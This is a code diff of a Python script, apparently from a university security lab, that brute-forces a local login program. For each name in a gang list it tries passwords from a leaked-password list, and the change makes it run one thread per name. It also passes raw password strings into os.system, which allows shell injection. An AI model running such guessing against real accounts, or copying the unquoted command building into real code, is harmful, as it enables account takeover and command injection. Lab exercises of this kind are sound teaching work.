@@ -4,14 +4,27 @@ import threading
 
 if __name__ in '__main__':
     start_time = time.time()
-    common_passwords=[i.strip() for i in open('/home/cse/Lab1/PwnedPWs100k.txt')][::-1]
+    common_passwords=[i.strip() for i in open('/home/cse/Lab1/PwnedPWs100k.txt')]
     gang_names=[i.strip() for i in open('/home/cse/Lab1/gang.txt')]
 
-    for name in gang_names:
-        for i in common_passwords:
-            if os.system('python3 ./Login.pyc '+ name + ' "'+i+'"' + " >/dev/null 2>&1") == 0:
-                print(name, i, "--- %s minutes ---" % ((time.time() - start_time) / 60))
+    def thread_function(i):
+        for j in range(10):
+            if os.system('python3 ./Login.pyc'+ ' ' + i + ' ' + common_passwords[j] + " >/dev/null 2>&1") == 0:
+                print(i, common_passwords[j], "--- %s seconds ---" % (time.time() - start_time))
                 break
+    
+    threads = list()
+    for i in gang_names:
+        x = threading.Thread(target=thread_function, args=(i,))
+        threads.append(x)
+        x.start()
+
+    for index, thread in enumerate(threads):
+        thread.join()
+        print("--- %s seconds ---" % (time.time() - start_time))
+
+
+
 
 
 
